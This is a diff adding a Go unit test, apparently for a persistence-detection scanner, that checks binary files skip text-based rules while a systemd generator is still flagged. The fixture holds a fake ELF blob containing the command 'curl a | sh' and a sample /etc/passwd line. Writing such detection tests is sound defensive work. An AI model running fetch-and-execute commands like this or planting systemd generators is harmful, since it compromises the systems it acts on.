@@ -126,3 +126,17 @@ func TestMascaraSegredosDaLinhaDeComando(t *testing.T) {
 }
 
 var _ = report.SeverityInfo
+
+func TestConteudoBinarioNaoPassaPelasRegrasDeTexto(t *testing.T) {
+	root := fstest.MapFS{
+		"etc/passwd": file("root:x:0:0:root:/root:/bin/bash\n"),
+		"etc/systemd/system-generators/compilado": &fstest.MapFile{Data: []byte("\x7fELF\x00\x00 /tmp/x ; curl a | sh\n"), Mode: 0o755},
+	}
+	hits := hitSigs(Analyze((&Collector{Root: root, Homes: Homes(root, 1000)}).Collect()))
+	if _, ok := hits["persistencia.execucao_em_temporario"]; ok {
+		t.Errorf("regra de texto aplicada a binário: %v", hits)
+	}
+	if _, ok := hits["persistencia.gerador_systemd"]; !ok {
+		t.Errorf("o gerador continua listado: %v", hits)
+	}
+}
